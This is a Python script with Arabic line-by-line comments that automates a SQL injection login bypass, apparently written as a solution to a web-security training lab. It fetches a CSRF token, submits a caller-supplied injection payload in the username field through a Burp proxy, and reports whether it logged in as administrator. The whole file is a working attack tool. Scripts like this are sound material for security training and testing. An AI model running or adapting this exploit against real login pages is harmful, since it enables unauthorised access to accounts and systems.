# استيراد مكتبة requests لإرسال طلبات HTTP
import requests

# استيراد مكتبة sys للتعامل مع المدخلات من سطر الأوامر
import sys

# استيراد مكتبة urllib3 للتعامل مع التحذيرات المتعلقة بالـ SSL
import urllib3

# استيراد BeautifulSoup من مكتبة bs4 لتحليل HTML
from bs4 import BeautifulSoup

# تعطيل تحذيرات urllib3 المتعلقة بشهادات SSL غير الموثوقة
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# تعريف بروكسي (هنا Burp Suite على المنفذ 8080) لاعتراض الطلبات
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# تعريف دالة لاستخراج توكن CSRF من الصفحة
def get_csrf_token(s, url):
    # إرسال طلب GET للصفحة مع تعطيل التحقق من SSL وباستخدام البروكسي
    r = s.get(url, verify=False, proxies=proxies)
    # تحويل محتوى الصفحة إلى كائن BeautifulSoup لتحليل HTML
    soup = BeautifulSoup(r.text, 'html.parser')
    # البحث عن أول عنصر <input> وأخذ قيمته (افتراضياً هو csrf token)
    csrf = soup.find("input")['value']
    # إرجاع التوكن
    return csrf

# تعريف الدالة الرئيسية لتنفيذ هجوم SQL Injection
def exploit_sqli(s, url, payload):
    # الحصول على توكن CSRF أولاً
    csrf = get_csrf_token(s, url)
    # إعداد بيانات النموذج (Form Data) مع وضع payload في حقل username
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}
    # إرسال طلب POST مع البيانات
    r = s.post(url, data=data, verify=False, proxies=proxies)
    # حفظ نص الرد
    res = r.text
    # التحقق من نجاح تسجيل الدخول عن طريق البحث عن كلمة "Log out"
    if "Log out" in res:
        return True
    else:
        return False

# الجزء الرئيسي من البرنامج (يُنفذ فقط إذا تم تشغيل الملف مباشرة)
if __name__ == "__main__":
    try:
        # أخذ الـ URL من المدخل الأول في سطر الأوامر
        url = sys.argv[1].strip()
        # أخذ payload SQL Injection من المدخل الثاني
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        # طباعة رسالة الاستخدام في حال عدم إدخال البارامترات
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        # إنهاء البرنامج (مفقود في الكود الأصلي لكن يُفضل إضافته)
        sys.exit(1)

    # إنشاء جلسة جديدة من requests (تحتفظ بالكوكيز)
    s = requests.Session()

    # تنفيذ الهجوم وطباعة النتيجة
    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')
